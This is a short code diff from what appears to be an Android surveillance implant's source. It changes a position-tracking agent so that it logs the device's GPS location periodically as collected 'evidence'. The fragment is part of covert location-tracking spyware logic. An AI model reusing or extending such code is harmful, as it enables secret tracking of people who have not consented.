@@ -8,6 +8,7 @@ import com.ht.RCSAndroidGUI.Device;
 import com.ht.RCSAndroidGUI.LogR;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.agent.position.GPSLocator;
+import com.ht.RCSAndroidGUI.agent.position.GPSLocatorPeriod;
 import com.ht.RCSAndroidGUI.conf.Configuration;
 import com.ht.RCSAndroidGUI.evidence.Evidence;
 import com.ht.RCSAndroidGUI.evidence.EvidenceType;
@@ -51,7 +52,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 	@Override
 	public void begin() {
 
-		locator = new GPSLocator(this, period);
+		locator = new GPSLocatorPeriod(this, period);
 		locator.start();
 
 	}
